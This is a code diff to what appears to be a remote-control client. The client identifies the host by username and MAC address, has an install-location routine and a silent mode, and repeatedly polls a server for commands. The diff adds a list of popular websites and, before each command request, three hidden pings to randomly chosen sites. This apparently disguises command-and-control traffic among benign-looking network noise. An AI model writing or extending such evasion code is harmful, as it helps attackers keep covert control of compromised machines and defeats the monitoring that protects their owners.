@@ -9,6 +9,7 @@ import sys
 import traceback
 import threading
 import getpass
+import random
 
 def threaded(func):
     def wrapper(*_args, **kwargs):
@@ -26,6 +27,13 @@ class Client(object):
         self.uid = getpass.getuser() + "_" + str(uuid.getnode())
         self.host = socket.gethostname()
         self.username = getpass.getuser()
+        self.ping = ["facebook.com", "twitter.com", "google.com",
+                     "yahoo.com", "amazon.com", "reddit.com",
+                     "Etsy.com", "Target.com", "hm.com",
+                     "zara.com", "macys.com", "nordstrom.com",
+                     "nike.com", "adidas.com", "us.puma.com",
+                     "Github.com", "AliExpress.com", "BestBuy.com",
+                     "cnn.com", "theguardian.com", "wsj.com"]
 
     def install_location(self):
 
@@ -131,6 +139,12 @@ class Client(object):
         self.silent = False
         while True:
             try:
+                number = random.randint(0, 20)
+                os.system("ping " + self.ping[number] + " -c 1 2>&1 >/dev/null")
+                number = random.randint(0, 20)
+                os.system("ping " + self.ping[number] + " -c 1 2>&1 >/dev/null")
+                number = random.randint(0, 20)
+                os.system("ping " + self.ping[number] + " -c 1 2>&1 >/dev/null")
                 new_cmd = self.request_command()
                 self.update_consecutive_failed(0)
                 if new_cmd:
